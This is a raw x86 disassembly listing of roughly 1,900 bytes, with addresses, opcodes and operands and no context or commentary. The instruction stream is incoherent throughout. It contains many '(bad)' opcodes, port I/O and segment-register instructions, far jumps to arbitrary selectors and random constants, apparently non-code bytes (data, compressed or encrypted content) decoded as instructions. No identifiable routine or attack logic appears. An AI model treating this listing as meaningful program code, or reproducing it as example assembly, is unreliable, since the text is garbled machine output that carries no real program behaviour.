  417352:	xchg   edx,eax
  417353:	dec    eax
  417354:	fild   WORD PTR [ecx+ebx*8]
  417357:	sahf   
  417358:	mov    BYTE PTR [edx+0x50],dl
  41735b:	fcmovne st,st(6)
  41735d:	mov    eax,0x97c7ff2
  417362:	and    esp,0x25c99df3
  417368:	imul   eax,DWORD PTR [esi-0x775afe0d],0x71
  41736f:	sbb    BYTE PTR [ebx-0x50],dh
  417372:	jg     0x4173eb
  417374:	xor    al,0x4e
  417376:	mov    cl,0xb2
  417378:	pop    ss
  417379:	jl     0x417341
  41737b:	outs   dx,DWORD PTR ds:[esi]
  41737c:	fist   DWORD PTR [edx+0x5c]
  41737f:	fstp   QWORD PTR [ecx-0x37c6eda9]
  417385:	mov    BYTE PTR [eax-0x57],al
  417388:	outs   dx,BYTE PTR ds:[esi]
  417389:	mov    ecx,ebp
  41738b:	fisttp DWORD PTR [eax]
  41738d:	xchg   ebp,eax
  41738e:	bound  eax,QWORD PTR [edx]
  417390:	and    eax,0xb444d652
  417395:	(bad)  
  417397:	retf   
  417398:	mov    ebx,0x59767221
  41739d:	mov    edx,0x3e87155a
  4173a2:	pop    ds
  4173a3:	xchg   ebx,eax
  4173a4:	std    
  4173a5:	push   cs
  4173a6:	sbb    eax,0x6d9c15fb
  4173ab:	je     0x4173dc
  4173ad:	loope  0x4173e9
  4173af:	pop    ss
  4173b0:	push   ebx
  4173b1:	scas   al,BYTE PTR es:[edi]
  4173b2:	jge    0x41739a
  4173b4:	loop   0x4173a0
  4173b6:	sbb    eax,0x406f3bec
  4173bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173bc:	push   ebp
  4173bd:	loop   0x417395
  4173bf:	mov    fs,WORD PTR [ebp-0x5397ed15]
  4173c5:	sub    edx,DWORD PTR [edi]
  4173c7:	fidiv  WORD PTR [ebp-0x6a]
  4173ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173cb:	jns    0x417414
  4173cd:	jno    0x417352
  4173cf:	mov    ds:0xafaaedb0,eax
  4173d4:	sub    DWORD PTR [edi+0x68],ebp
  4173d7:	pop    ebp
  4173d8:	in     al,0xb9
  4173da:	ficomp WORD PTR [edx]
  4173dc:	add    ebp,DWORD PTR [ecx]
  4173de:	fsubp  st(1),st
  4173e0:	jmp    FWORD PTR [eax+0x69]
  4173e3:	test   al,0xda
  4173e5:	jl     0x417431
  4173e7:	pop    esp
  4173e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173e9:	dec    ebp
  4173ea:	int    0xb2
  4173ec:	add    eax,0x6c39afc2
  4173f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f2:	jg     0x41746a
  4173f4:	stc    
  4173f5:	popa   
  4173f6:	jne    0x4173b0
  4173f8:	push   ebx
  4173f9:	xchg   ebx,eax
  4173fa:	adc    BYTE PTR gs:[esi-0x16],cl
  4173fe:	and    BYTE PTR [esp+edx*4+0x61b1b039],bh
  417405:	cdq    
  417406:	test   DWORD PTR cs:[ebp+0x7e645e22],edi
  41740d:	mov    dh,0x67
  41740f:	jecxz  0x4173f7
  417411:	mov    cl,BYTE PTR [ebp+0x6a9260df]
  417417:	mov    ebx,DWORD PTR [ebx+eax*4-0x7d]
  41741b:	mov    WORD PTR [esi-0x5e228abc],?
  417421:	add    al,0x79
  417423:	push   edi
  417424:	call   0xd3:0xf7461ab4
  41742b:	aas    
  41742c:	push   edi
  41742d:	gs push cs
  41742f:	loope  0x4173bc
  417431:	out    dx,al
  417432:	xlat   BYTE PTR ds:[ebx]
  417433:	fadd   QWORD PTR [eax+0x5b]
  417436:	inc    edx
  417437:	ja     0x41742e
  417439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41743a:	ja     0x417477
  41743c:	je     0x4173c0
  41743e:	jns    0x417430
  417440:	push   DWORD PTR [edi-0x2ee572cf]
  417446:	int3   
  417447:	nop
  417448:	aam    0x9c
  41744a:	mov    edi,0x11f31365
  41744f:	or     al,0x6b
  417451:	loope  0x417415
  417453:	add    BYTE PTR [ebp-0x464f01e7],0x88
  41745a:	cmp    edx,DWORD PTR [edx+0x30]
  41745d:	nop
  41745e:	ins    BYTE PTR es:[edi],dx
  41745f:	pop    ebp
  417460:	mov    eax,ds:0x2ccace17
  417465:	push   ebp
  417466:	test   dl,bl
  417468:	inc    esp
  417469:	pop    ds
  41746a:	inc    ebx
  41746b:	not    BYTE PTR [edi+0x96d5d2e]
  417471:	jo     0x417459
  417473:	sbb    DWORD PTR [eax-0x7f],ebx
  417476:	(bad)  
  417477:	iret   
  417478:	imul   DWORD PTR [esi-0x3b]
  41747b:	push   0xfffffffa
  41747d:	jl     0x417491
  41747f:	pop    esi
  417480:	aaa    
  417481:	sub    ebp,DWORD PTR [edi+esi*8+0x79]
  417485:	xor    DWORD PTR [esi+0x4c],ecx
  417488:	pop    ds
  417489:	out    dx,eax
  41748a:	js     0x41745c
  41748c:	gs cmp eax,0xf269232a
  417492:	mov    ch,BYTE PTR [ecx]
  417494:	pop    eax
  417495:	repz in eax,dx
  417497:	mov    cl,0xd3
  417499:	mov    DWORD PTR [esi+0x52b1060b],eax
  41749f:	jecxz  0x4174aa
  4174a1:	jle    0x4174c3
  4174a3:	retf   
  4174a4:	int3   
  4174a5:	jne    0x41747c
  4174a7:	lods   al,BYTE PTR ds:[esi]
  4174a8:	aam    0x2b
  4174aa:	add    eax,0xb5b4b2
  4174af:	xchg   DWORD PTR [esi-0x7b],edx
  4174b2:	ficomp WORD PTR [ecx-0x16]
  4174b5:	sub    esi,ebx
  4174b7:	shr    BYTE PTR [ebx],1
  4174b9:	cdq    
  4174ba:	inc    eax
  4174bb:	in     eax,dx
  4174bc:	jmp    0x4bb8:0x64ef7c4c
  4174c3:	and    bh,cl
  4174c5:	cdq    
  4174c6:	mov    ecx,0xb6ddcb96
  4174cb:	jg     0x41746e
  4174cd:	pop    es
  4174ce:	sbb    BYTE PTR [edx],bh
  4174d0:	mov    ds:0x4ecca47a,eax
  4174d5:	(bad)  
  4174d6:	imul   bp,sp,0x176b
  4174db:	(bad)  
  4174dc:	pop    ecx
  4174dd:	push   0xb
  4174df:	dec    ecx
  4174e0:	jno    0x41754c
  4174e2:	outs   dx,BYTE PTR ds:[esi]
  4174e3:	das    
  4174e4:	enter  0x3ab6,0x3
  4174e8:	push   cs
  4174e9:	xchg   dh,dh
  4174eb:	fs mov ecx,0x7c13f9a2
  4174f1:	cli    
  4174f2:	sub    eax,DWORD PTR [edi]
  4174f4:	into   
  4174f5:	mov    ecx,0x368f8618
  4174fa:	and    cl,BYTE PTR [edx+0x18440300]
  417500:	pop    ecx
  417501:	xchg   edi,eax
  417502:	fcomp  DWORD PTR [eax]
  417504:	repz popa 
  417506:	add    dh,BYTE PTR [esi]
  417508:	mov    ds:0xfda8ebf0,al
  41750d:	mov    ebx,0xf84ef11e
  417512:	and    al,0xee
  417514:	pop    eax
  417515:	mov    ebx,DWORD PTR [esi]
  417517:	addr16 mov dh,0x9f
  41751a:	or     ebx,DWORD PTR [ebx+0x306fc178]
  417520:	push   cs
  417521:	pop    ss
  417522:	int    0x4e
  417524:	cmp    BYTE PTR [eax],0xd9
  417527:	retf   
  417528:	mov    BYTE PTR [eax-0x2e04dda3],bh
  41752e:	out    dx,eax
  41752f:	sbb    ebp,ebx
  417531:	data16 add BYTE PTR [esi+0x28],cl
  417535:	in     al,dx
  417536:	xor    esi,DWORD PTR [esi+0xe]
  417539:	jbe    0x4175b5
  41753b:	jne    0x417591
  41753d:	adc    dh,bh
  41753f:	jno    0x4174f0
  417541:	rcr    DWORD PTR [edx+0x28],0x3c
  417545:	fs pop eax
  417547:	pop    ebp
  417548:	pop    ecx
  417549:	jne    0x4174f5
  41754b:	icebp  
  41754c:	push   eax
  41754d:	fs cld 
  41754f:	setnp  BYTE PTR [eax]
  417552:	and    esi,ecx
  417554:	push   ebx
  417555:	test   eax,0xe713024e
  41755a:	(bad)  
  41755c:	xor    edx,DWORD PTR ds:0xfa65f3fa
  417562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417563:	cmp    DWORD PTR [eax+0x6d],0x2d9a549d
  41756a:	shr    DWORD PTR [ecx+0x59],1
  41756d:	mov    ds:0x2993038b,eax
  417572:	ins    DWORD PTR es:[edi],dx
  417573:	mov    ah,0xf4
  417575:	jmp    0x2351b330
  41757a:	xor    eax,0xe98c79e4
  41757f:	jno    0x41753e
  417581:	mov    ebp,0xb9ba86d6
  417586:	sar    DWORD PTR [edi],0xd4
  417589:	xchg   ebp,ebp
  41758b:	sub    ch,bl
  41758d:	mov    ebp,0x37fde0a7
  417592:	inc    ebp
  417593:	or     ecx,DWORD PTR [edx+edx*2+0x59]
  417597:	pop    edi
  417598:	push   edx
  417599:	mov    dl,BYTE PTR [ebx-0x543dd3c9]
  41759f:	lods   eax,DWORD PTR ds:[esi]
  4175a0:	pushf  
  4175a1:	in     eax,dx
  4175a2:	ins    BYTE PTR es:[edi],dx
  4175a3:	fwait
  4175a4:	leave  
  4175a5:	xor    dl,BYTE PTR [ecx]
  4175a7:	(bad)
  4175aa:	pushf  
  4175ab:	or     ecx,DWORD PTR [ebx+edi*2-0x5d732ca9]
  4175b2:	fisub  DWORD PTR [ecx+0xe]
  4175b5:	adc    al,0x42
  4175b7:	pop    ebp
  4175b8:	jmp    0x417620
  4175ba:	sbb    edi,DWORD PTR [ebp+0x1aed5f23]
  4175c0:	push   ecx
  4175c1:	dec    esp
  4175c2:	cmp    edx,eax
  4175c4:	aam    0x93
  4175c6:	push   ecx
  4175c7:	cdq    
  4175c8:	in     al,dx
  4175c9:	or     dl,BYTE PTR [esi-0x7e]
  4175cc:	repz inc ecx
  4175ce:	test   bh,dh
  4175d0:	loopne 0x41755f
  4175d2:	stos   BYTE PTR es:[edi],al
  4175d3:	sub    eax,0x62c3bd70
  4175d8:	mov    esi,0x2d813353
  4175dd:	das    
  4175de:	push   ebp
  4175df:	adc    cl,BYTE PTR [ebx]
  4175e1:	fild   DWORD PTR [ecx]
  4175e3:	js     0x417572
  4175e5:	mov    ds:0xe1dd606c,al
  4175ea:	(bad)  
  4175eb:	pop    ds
  4175ec:	test   eax,0x35bbd4d7
  4175f1:	add    BYTE PTR [ecx+ecx*4-0x2aa5e0d2],bl
  4175f8:	ss xchg edi,eax
  4175fa:	xor    BYTE PTR [edi-0x44aec8d0],ah
  417600:	adc    eax,0xb507820e
  417605:	push   esi
  417606:	push   es
  417607:	std    
  417608:	(bad)  [ecx]
  41760a:	inc    ecx
  41760b:	jmp    0xee18:0xe376d11a
  417612:	ror    BYTE PTR [edi+ebx*4+0x27],0xd0
  417617:	inc    ebx
  417618:	test   al,0x10
  41761a:	xchg   edi,eax
  41761b:	pop    edi
  41761c:	test   dh,bl
  41761e:	outs   dx,BYTE PTR ds:[esi]
  41761f:	iret   
  417620:	mov    dl,0x1a
  417622:	pop    ds
  417623:	idiv   bh
  417625:	pop    ss
  417626:	jbe    0x4175c8
  417628:	jecxz  0x417692
  41762a:	mov    bh,BYTE PTR [ebp+0x3a751f25]
  417630:	dec    ecx
  417631:	enter  0xfd41,0x37
  417635:	sahf   
  417636:	cmp    DWORD PTR [edx],ecx
  417638:	adc    BYTE PTR [eax-0x4afd6396],0x32
  41763f:	arpl   WORD PTR [ebp+0x495df43e],ax
  417645:	(bad)  
  417646:	fwait
  417647:	pop    ebx
  417648:	xchg   edi,eax
  417649:	out    0x1a,eax
  41764b:	aam    0x31
  41764d:	push   esi
  41764e:	mov    ds:0x1ab72984,al
  417653:	mov    esi,0xf02cb3f
  417658:	jl     0x4175f6
  41765a:	pop    ebp
  41765b:	xor    esi,ebx
  41765d:	and    DWORD PTR cs:[edi],ecx
  417660:	loope  0x417688
  417662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417663:	add    BYTE PTR ds:0x411e86ad,0xd0
  41766a:	xchg   esp,eax
  41766b:	outs   dx,BYTE PTR ds:[esi]
  41766c:	xchg   esi,eax
  41766d:	sti    
  41766e:	(bad)  
  41766f:	mov    ecx,0xc4d1fd21
  417674:	adc    DWORD PTR [ebx-0x6fcaf349],ebx
  41767a:	mov    ds:0x6cf4472c,al
  41767f:	cmp    ah,0x12
  417682:	mov    bh,0x48
  417684:	mov    ds:0xec53d897,eax
  417689:	sub    esp,esi
  41768b:	fcmovbe st,st(3)
  41768d:	ja     0x417623
  41768f:	lock stc 
  417691:	test   DWORD PTR [edi-0x72],esi
  417694:	xchg   ecx,eax
  417695:	or     ebp,DWORD PTR ds:0xa3507f73
  41769b:	call   0x4d8d:0xa7345986
  4176a2:	fwait
  4176a3:	call   0x6e0a193c
  4176a8:	mov    ds:0x3247291b,eax
  4176ad:	loop   0x41765f
  4176af:	mov    ebp,0x39b0f822
  4176b4:	add    BYTE PTR [bp+si+0x4da0],ah
  4176b9:	adc    eax,0xa6aaf661
  4176be:	in     al,dx
  4176bf:	loopne 0x4176dc
  4176c1:	out    0xf9,al
  4176c3:	outs   dx,BYTE PTR ds:[esi]
  4176c4:	rcr    BYTE PTR [edi],1
  4176c6:	jl     0x4176a4
  4176c8:	pop    edx
  4176c9:	jnp    0x4176e3
  4176cb:	xchg   esi,eax
  4176cc:	ret    
  4176cd:	sbb    bl,BYTE PTR ds:[esi]
  4176d0:	aad    0x6a
  4176d2:	push   ds
  4176d3:	in     al,dx
  4176d4:	dec    ecx
  4176d5:	add    eax,0x982cf8a5
  4176da:	push   es
  4176db:	dec    esi
  4176dc:	inc    edi
  4176dd:	icebp  
  4176de:	retf   
  4176df:	cs jl  0x417671
  4176e2:	pop    eax
  4176e3:	jns    0x4176e6
  4176e5:	test   BYTE PTR [ecx],cl
  4176e7:	sbb    esp,DWORD PTR [eax-0x307eb33d]
  4176ed:	cmp    ecx,DWORD PTR [edx]
  4176ef:	push   0xf74f4c8
  4176f4:	inc    edx
  4176f5:	adc    DWORD PTR [ebx-0x27846c8f],eax
  4176fb:	int    0x65
  4176fd:	nop
  4176fe:	xor    bh,BYTE PTR [ebp+eiz*2+0x7c81ee22]
  417705:	mov    ds,WORD PTR [edx+0x3b]
  417708:	dec    esp
  417709:	jmp    0xb63:0xa4cd8590
  417710:	pusha  
  417711:	mov    dh,0x10
  417713:	fwait
  417714:	sbb    eax,edx
  417716:	add    dh,bl
  417718:	cmp    edx,DWORD PTR [esp+ecx*2]
  41771b:	aaa    
  41771c:	inc    eax
  41771d:	xor    eax,0x9d1ada06
  417722:	shl    BYTE PTR [ebp+0x5bc9c26c],1
  417728:	gs xchg ebp,eax
  41772a:	xor    bh,BYTE PTR [edi+0x3f]
  41772d:	dec    al
  41772f:	push   edx
  417730:	lock mov esp,0x3dbf175a
  417736:	imul   ebx,ebx,0x49
  417739:	imul   edx,DWORD PTR [ebp+0x48],0x43
  41773d:	mov    dl,0x1
  41773f:	pop    edi
  417740:	add    BYTE PTR [esi+edx*8],0x27
  417744:	pushf  
  417745:	(bad)  
  417746:	(bad)  
  417747:	push   eax
  417748:	pop    edi
  417749:	or     al,0x77
  41774b:	sub    bl,BYTE PTR [ebp-0x1f]
  41774e:	push   esi
  41774f:	xchg   ecx,eax
  417750:	push   eax
  417751:	out    0xb5,al
  417753:	xchg   ebp,eax
  417754:	pop    es
  417755:	add    al,0xe3
  417757:	mov    bl,0x10
  417759:	push   es
  41775a:	pop    ds
  41775b:	add    eax,0x592a14be
  417760:	jno    0x41776b
  417762:	xchg   esp,eax
  417763:	inc    ecx
  417764:	adc    BYTE PTR [eax-0x19],dl
  417767:	jns    0x417765
  417769:	lock les edi,FWORD PTR [edi]
  41776c:	ficom  WORD PTR [eax-0x5f072fbd]
  417772:	cmc    
  417773:	cmp    al,0x83
  417775:	mov    dh,BYTE PTR [edi-0x78]
  417778:	mov    ds:0xd9eb939e,al
  41777d:	(bad)  
  41777e:	aad    0x49
  417780:	es (bad) 
  417782:	cs call 0x3689ed4b
  417788:	jns    0x417716
  41778a:	(bad)  
  41778b:	addr16 ds sti 
  41778e:	pop    ss
  41778f:	inc    ecx
  417790:	jmp    0x4177ac
  417792:	loopne 0x4177ce
  417794:	jmp    DWORD PTR ds:0xcf9b2ae1
  41779a:	jge    0x4177ad
  41779c:	mov    bh,BYTE PTR [ebp+0x70d14024]
  4177a2:	mov    ?,ecx
  4177a4:	mov    eax,0x7c621a74
  4177a9:	add    eax,0xc7f93d8c
  4177ae:	xchg   esp,edi
  4177b0:	std    
  4177b1:	adc    dh,0xc9
  4177b4:	fs mov cl,0x31
  4177b7:	pop    eax
  4177b8:	push   eax
  4177b9:	aaa    
  4177ba:	fisub  DWORD PTR [ecx+0x5b]
  4177bd:	sub    DWORD PTR [esi+0x74],edx
  4177c0:	pusha  
  4177c1:	sahf   
  4177c2:	pop    edx
  4177c3:	rcr    BYTE PTR [ebp+0x155af474],1
  4177c9:	inc    ebx
  4177ca:	jne    0x417755
  4177cc:	xor    BYTE PTR [edi-0x6e816528],dl
  4177d2:	add    DWORD PTR [ebx-0x24607bd7],ecx
  4177d8:	mov    ecx,0x7688d652
  4177dd:	mov    ds:0x5ed8525d,eax
  4177e2:	js     0x4177ec
  4177e4:	xor    dl,bh
  4177e6:	fist   WORD PTR ss:[ebp-0x52]
  4177ea:	xchg   ebp,eax
  4177eb:	sub    ch,BYTE PTR [ebx]
  4177ed:	mov    ch,0x89
  4177ef:	sub    al,0x6a
  4177f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177f2:	ins    BYTE PTR es:[edi],dx
  4177f3:	pop    esp
  4177f4:	mov    dh,0x4f
  4177f6:	(bad)  
  4177f7:	into   
  4177f8:	push   0x42143c3b
  4177fd:	add    ch,BYTE PTR [ecx+0x4f19da5b]
  417803:	shl    BYTE PTR [esi],1
  417805:	fwait
  417806:	inc    esi
  417807:	cdq    
  417808:	lods   eax,DWORD PTR ds:[esi]
  417809:	out    dx,ax
  41780b:	hlt    
  41780c:	dec    esi
  41780d:	fs rep ins DWORD PTR es:[edi],dx
  417810:	sahf   
  417811:	pop    edi
  417812:	mov    edi,0xabc3eddc
  417817:	or     eax,0xb69c2e39
  41781c:	push   0xffffffc1
  41781e:	inc    ebp
  41781f:	mov    BYTE PTR ds:0xbba6a548,bl
  417825:	mov    edx,0x25db315e
  41782a:	(bad)  
  41782b:	xlat   BYTE PTR ds:[ebx]
  41782c:	ret    
  41782d:	in     eax,0xaa
  41782f:	stc    
  417830:	inc    eax
  417831:	xor    esp,ebx
  417833:	push   esp
  417834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417835:	cmp    dl,BYTE PTR ds:0xa6020f40
  41783b:	or     BYTE PTR [edx],al
  41783d:	sub    DWORD PTR [eax+0x79598ff6],esp
  417843:	mov    BYTE PTR [edx-0x76],ch
  417846:	xor    eax,0xf0b20f5
  41784b:	dec    edx
  41784c:	xchg   DWORD PTR [ecx],esi
  41784e:	(bad)  
  41784f:	cmp    DWORD PTR [eax+0x5e],ebp
  417852:	(bad)
  417855:	bound  ebx,QWORD PTR [edi]
  417857:	jle    0x41785e
  417859:	jmp    0x2f6c:0xa0b51d26
  417860:	jp     0x41784c
  417862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417863:	shr    DWORD PTR [eax+0x55fc0f62],cl
  417869:	sub    BYTE PTR [eax+0x48],dl
  41786c:	scas   eax,DWORD PTR es:[edi]
  41786d:	enter  0x9c6d,0x30
  417871:	ins    DWORD PTR es:[edi],dx
  417872:	sub    dh,BYTE PTR [edi]
  417874:	and    dl,0x1e
  417877:	int3   
  417878:	cld    
  417879:	mov    bh,0x2
  41787b:	fldenv [eax-0x29]
  41787e:	cmp    al,0xc4
  417880:	cmp    eax,0x3fe9dd4f
  417885:	mov    esi,0x3c5c0ee4
  41788a:	test   al,0x3e
  41788c:	cmp    esi,DWORD PTR [ecx-0x5bf9a8ff]
  417892:	xlat   BYTE PTR ds:[ebx]
  417893:	mul    DWORD PTR [edi+0x28]
  417896:	int3   
  417897:	sbb    ebp,edi
  417899:	push   esi
  41789a:	xor    edi,esp
  41789c:	test   BYTE PTR [edi+eiz*2+0x4e5fb039],0xb2
  4178a4:	sub    esp,DWORD PTR [ecx]
  4178a6:	add    BYTE PTR [edi],bl
  4178a8:	js     0x417902
  4178aa:	or     ebp,eax
  4178ac:	adc    eax,0xb4677bb4
  4178b1:	ja     0x417849
  4178b3:	lods   eax,DWORD PTR ds:[esi]
  4178b4:	mov    ch,0x35
  4178b6:	js     0x417870
  4178b8:	(bad)
  4178bb:	mov    esi,0x8ccc682f
  4178c0:	fcom   DWORD PTR [edi]
  4178c2:	mov    ecx,0xdd2768e8
  4178c7:	sub    dl,BYTE PTR [esi+0x2e]
  4178ca:	xor    cl,al
  4178cc:	mov    bh,0x39
  4178ce:	imul   BYTE PTR [esi]
  4178d0:	fstp   st(1)
  4178d2:	inc    edi
  4178d3:	outs   dx,DWORD PTR ds:[esi]
  4178d4:	sahf   
  4178d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178d6:	sbb    DWORD PTR [esi+0x3b],0xd90c1991
  4178dd:	xchg   ecx,eax
  4178de:	ins    BYTE PTR es:[edi],dx
  4178df:	jle    0x41792c
  4178e1:	and    al,0xe4
  4178e3:	mov    ah,0x81
  4178e5:	out    dx,al
  4178e6:	cmp    BYTE PTR [ebp+0x3eaee7f9],bh
  4178ec:	dec    edx
  4178ed:	dec    ebx
  4178ee:	std    
  4178ef:	test   eax,0x6ba42d85
  4178f4:	or     BYTE PTR [eax+ecx*2+0x52bb8996],0x83
  4178fc:	pop    ds
  4178fd:	cld    
  4178fe:	js     0x417884
  417900:	sub    bh,BYTE PTR [esi+0x25448aec]
  417906:	or     BYTE PTR [eax+0x1b],cl
  417909:	ins    DWORD PTR es:[edi],dx
  41790a:	or     DWORD PTR [edx],edx
  41790c:	pop    ss
  41790d:	sub    BYTE PTR [ebx-0x27],0x50
  417911:	and    eax,0x4f76b24d
  417916:	mov    BYTE PTR [esi],0x78
  417919:	int    0x41
  41791b:	ja     0x417933
  41791d:	int3   
  41791e:	jecxz  0x417953
  417920:	pop    edx
  417921:	out    dx,eax
  417922:	or     al,0x58
  417924:	fsub   st,st(6)
  417926:	in     eax,dx
  417927:	sti    
  417928:	in     al,0xa3
  41792a:	push   edx
  41792b:	sahf   
  41792c:	mov    al,ds:0x8400e5a3
  417931:	lock push dx
  417934:	dec    edi
  417935:	jecxz  0x417970
  417937:	out    0xea,eax
  417939:	jae    0x417940
  41793b:	mov    DWORD PTR [edi],ebx
  41793d:	jp     0x41796d
  41793f:	fs cdq 
  417941:	sahf   
  417942:	dec    ebx
  417943:	dec    eax
  417944:	pop    ebp
  417945:	fstp   QWORD PTR [ebx-0x67]
  417948:	test   BYTE PTR [ecx-0x6498767f],ah
  41794e:	and    eax,DWORD PTR [ecx]
  417950:	xchg   ecx,eax
  417951:	dec    esp
  417952:	addr16 popa 
  417954:	ret    
  417955:	ror    ebp,0xa8
  417958:	data16 mov ch,bh
  41795b:	push   es
  41795c:	xchg   edi,eax
  41795d:	dec    ecx
  41795e:	add    al,0xdf
  417960:	jl     0x417909
  417962:	ror    cl,1
  417964:	mov    ah,0x22
  417966:	stos   DWORD PTR es:[edi],eax
  417967:	mov    ch,0xc9
  417969:	retf   0xe2b3
  41796c:	sub    eax,0xe6083936
  417971:	dec    ebp
  417972:	xor    eax,0x9acfa9c1
  417977:	clc    
  417978:	mov    ds:0x1a882986,eax
  41797d:	or     BYTE PTR [edx+ecx*2],al
  417980:	inc    esi
  417981:	(bad)  
  417982:	fld    TBYTE PTR [edi-0x18b878d4]
  417988:	xchg   ebp,eax
  417989:	stos   BYTE PTR es:[edi],al
  41798a:	push   cs
  41798b:	jge    0x4179aa
  41798d:	(bad)  
  41798e:	imul   esi,DWORD PTR [edx-0x35],0x28a620f3
  417995:	cmp    esp,DWORD PTR [edx-0x35]
  417998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417999:	jns    0x417970
  41799b:	dec    esi
  41799c:	or     ebp,edi
  41799e:	cwde   
  41799f:	das    
  4179a0:	cmp    dl,BYTE PTR [ebp+0x7d]
  4179a3:	or     esp,ebx
  4179a5:	inc    edx
  4179a6:	stc    
  4179a7:	es push cs
  4179a9:	sti    
  4179aa:	jmp    0xa0d8aa88
  4179af:	mov    dl,0xf0
  4179b1:	dec    esi
  4179b2:	push   es
  4179b3:	ins    DWORD PTR es:[edi],dx
  4179b4:	xchg   edx,eax
  4179b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179b6:	out    dx,al
  4179b7:	xor    BYTE PTR [ecx+eiz*2-0x70849bb6],bh
  4179be:	xchg   esp,eax
  4179bf:	stc    
  4179c0:	dec    eax
  4179c1:	push   cs
  4179c2:	addr16 pop edi
  4179c4:	push   ecx
  4179c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179c6:	mov    ebp,0xae7b701b
  4179cb:	xchg   cl,al
  4179cd:	retf   0xdf10
  4179d0:	out    dx,eax
  4179d1:	sub    cl,BYTE PTR [ecx-0x56856127]
  4179d7:	xchg   DWORD PTR [ecx-0x4f],edi
  4179da:	or     esp,DWORD PTR [ebx]
  4179dc:	out    0xee,al
  4179de:	inc    esi
  4179df:	stc    
  4179e0:	sbb    DWORD PTR [esi+0x7f59840],edx
  4179e6:	lahf   
  4179e7:	mov    esp,0xd12acca
  4179ec:	sub    al,0xce
  4179ee:	mov    ch,0x4c
  4179f0:	pop    edx
  4179f1:	jg     0x417a02
  4179f3:	ins    DWORD PTR es:[edi],dx
  4179f4:	pop    edx
  4179f5:	mov    edx,0x2a7d6b35
  4179fa:	pop    ebx
  4179fb:	cmp    BYTE PTR ds:0x62613133,dh
  417a01:	(bad)
  417a04:	dec    eax
  417a05:	(bad)  
  417a06:	(bad)  
  417a07:	es out dx,eax
  417a09:	dec    edi
  417a0a:	(bad)
  417a0d:	and    eax,0x230faa57
  417a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a13:	pop    edi
  417a14:	jno    0x417999
  417a16:	out    dx,eax
  417a17:	sti    
  417a18:	test   DWORD PTR [edx-0x385e1083],ebx
  417a1e:	lahf   
  417a1f:	sahf   
  417a20:	sub    al,0x1d
  417a22:	push   ebx
  417a23:	mov    ebx,DWORD PTR [ebp+eiz*4-0x2]
  417a27:	mov    edi,0x26a58ab7
  417a2c:	mov    dl,0x8
  417a2e:	mov    ecx,0x6bf5919a
  417a33:	leave  
  417a34:	das    
  417a35:	shr    BYTE PTR [ebx+0x3bc1fdc6],cl
  417a3b:	das    
  417a3c:	cmp    dh,ah
  417a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a3f:	enter  0x97ba,0x26
  417a43:	repnz lock (bad) 
  417a46:	ds scas eax,DWORD PTR es:[edi]
  417a48:	cmc    
  417a49:	jge    0x417a46
  417a4b:	sbb    BYTE PTR [ecx+0x41232f2a],0xcd
  417a52:	out    0xc,eax
  417a54:	es in  al,dx
  417a56:	mov    bh,0x65
  417a58:	sbb    dh,BYTE PTR [esi]
  417a5a:	aas    
  417a5b:	loop   0x417a76
  417a5d:	mov    ds:0x4b77ee1e,ax
  417a63:	mov    BYTE PTR [ecx],dl
  417a65:	pop    ds
  417a66:	popa   
  417a67:	sar    BYTE PTR [ecx+0x35],cl
  417a6a:	push   es
  417a6b:	shl    BYTE PTR [esi],cl
  417a6d:	sbb    al,0x75
  417a6f:	fwait
  417a70:	mov    al,ds:0xc361e18
  417a75:	retf   
  417a76:	stos   BYTE PTR es:[edi],al
  417a77:	scas   eax,DWORD PTR es:[edi]
  417a78:	jnp    0x417a89
  417a7a:	cmp    eax,DWORD PTR [eax+0x37fdf5ea]
  417a80:	mov    eax,0x91d606b
  417a85:	call   0x9c070be0
  417a8a:	fs xor al,0xc1
  417a8d:	ds jbe 0x417a45
  417a90:	in     al,dx
  417a91:	inc    esi
  417a92:	mov    eax,0x2730324c
  417a97:	xchg   ebx,eax
  417a98:	outs   dx,BYTE PTR ds:[esi]
  417a99:	std    
  417a9a:	push   edx
  417a9b:	loopne 0x417a24
  417a9d:	mov    ebx,0x7b86513d
  417aa2:	jno    0x417ae6
  417aa4:	retf   
  417aa5:	or     al,0x94
  417aa7:	push   ss
  417aa8:	fsubr  DWORD PTR [ebp-0x771dc291]
  417aae:	shl    BYTE PTR [esi-0x24dc3fbc],0x7e
  417ab5:	dec    edx
  417ab6:	rcr    BYTE PTR ds:0xd462c564,cl
  417abc:	jle    0x417b1a
  417abe:	push   edx
  417abf:	push   0x1a
  417ac1:	xchg   esi,eax
  417ac2:	(bad)  
  417ac3:	dec    esp
  417ac4:	loopne 0x417ac1
  417ac6:	dec    ecx
  417ac7:	xchg   cl,ah
  417ac9:	and    eax,0x2eeee22c
  417ace:	add    al,0x58
  417ad0:	adc    eax,0x8424fa1d
  417ad5:	or     dh,BYTE PTR [esp+ebx*2-0x68]
  417ad9:	dec    esi
  417ada:	rcl    DWORD PTR [edx+0x50],1
  417add:	and    edx,DWORD PTR [edx-0x30]
  417ae0:	mov    al,ds:0x61100dfc
  417ae5:	daa    
  417ae6:	sub    dl,BYTE PTR [edx+ebx*2]
  417ae9:	mov    bl,0x57
  417aeb:	xor    ah,al
  417aed:	or     BYTE PTR [eax],bl
  417aef:	add    BYTE PTR [esi],bl
  417af1:	test   BYTE PTR [ebx-0x2709d2e2],0x38
  417af8:	cmp    al,0xb5
  417afa:	gs stc 
  417afc:	stos   DWORD PTR es:[edi],eax
  417afd:	call   0xdc49:0xd10582d2
  417b04:	sti    
  417b05:	gs icebp 
  417b07:	fucomip st,st(6)
  417b09:	and    eax,0x127502fb
